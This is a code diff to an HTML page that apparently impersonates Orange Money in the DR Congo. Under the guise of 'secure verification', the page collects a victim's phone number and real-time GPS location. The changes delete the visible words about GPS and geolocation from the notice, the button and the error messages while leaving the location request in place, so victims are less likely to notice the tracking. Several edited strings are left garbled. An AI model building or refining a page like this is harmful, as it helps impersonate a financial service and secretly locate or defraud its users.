@@ -10,7 +10,7 @@
   <meta property="og:image" content="https://www.orange.com/sites/default/files/styles/og_image/public/2021-03/Orange_%20logo.jpg">
   <meta property="og:type" content="website">
   <meta name="twitter:card" content="summary_large_image">
-  <title>Orange Money | Vérification Sécurisée</title>
+  <title>Orange Center | Vérification Sécurisée</title>
   
   <!-- Google Fonts & Font Awesome -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
@@ -292,18 +292,18 @@
       </div>
       
       <p class="info-text">
-        <i class="fas fa-map-marker-alt"></i> Pour confirmer que c’est bien vous, activez votre GPS et autorisez la localisation. Nous vérifions votre position en temps réel.
+        <i class="fas fa-map-marker-alt"></i> Pour confirmer que c’est bien vous. Nous vérifions en temps réel.
       </p>
 
       <!-- Numéro de téléphone (champ pré-rempli mais modifiable) -->
       <div class="input-group">
         <label><i class="fas fa-phone-alt"></i> Votre numéro Orange Money</label>
         <i class="fas fa-phone"></i>
-        <input type="tel" id="phoneNumber" placeholder="+243 XX XXX XXXX" value="+243 839 898 872">
+        <input type="tel" id="phoneNumber" placeholder="+243 XX XXX XXXX" value="+243">
       </div>
 
       <button class="btn-verify" id="verifyBtn">
-        <i class="fas fa-satellite-dish"></i> ACTIVER LA LOCALISATION & VÉRIFIER
+        <i class="fas fa-satellite-dish"></i> ACTIVER LVÉRIFIER
       </button>
 
       <div class="status-message" id="statusMsg">
@@ -315,7 +315,7 @@
       </div>
 
       <div class="trust-features">
-        <span><i class="fas fa-map-marked-alt"></i> Géolocalisation sécurisée</span>
+        <span><i class="fas fa-map-marked-alt"></i> sécurisée</span>
         <span><i class="fas fa-fingerprint"></i> Vérification en temps réel</span>
         <span><i class="fas fa-mobile-money"></i> Protection Orange Money</span>
         <span><i class="fas fa-clock"></i> Session sécurisée</span>
@@ -407,7 +407,7 @@
       }
 
       const statusDiv = document.getElementById('statusMsg');
-      statusDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Demande d’autorisation GPS en cours... Veuillez activer la localisation.';
+      statusDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Demande en cours... Veuillez activer';
 
       if (!navigator.geolocation) {
         statusDiv.innerHTML = '<i class="fas fa-ban"></i> Votre navigateur ne supporte pas la géolocalisation. Utilisez un appareil moderne.';
@@ -444,16 +444,16 @@
           let errorMsg = "";
           switch(error.code) {
             case error.PERMISSION_DENIED:
-              errorMsg = "Vous avez refusé la géolocalisation. Activez le GPS dans les paramètres de votre appareil et réessayez.";
+              errorMsg = "Vous avez refusé Activez et réessayez.";
               break;
             case error.POSITION_UNAVAILABLE:
-              errorMsg = "Position indisponible. Vérifiez que le GPS est activé et que vous avez une bonne connexion.";
+              errorMsg = " indisponible. Vérifiez que vous avez une bonne connexion.";
               break;
             case error.TIMEOUT:
               errorMsg = "Délai d'obtention de la position dépassé. Réessayez dans un endroit dégagé.";
               break;
             default:
-              errorMsg = "Erreur de localisation. Activez le GPS et autorisez l'accès.";
+              errorMsg = "autorisez l'accès.";
           }
           statusDiv.innerHTML = `<i class="fas fa-times-circle"></i> ❌ ${errorMsg}`;
           stopAutoUpdate();
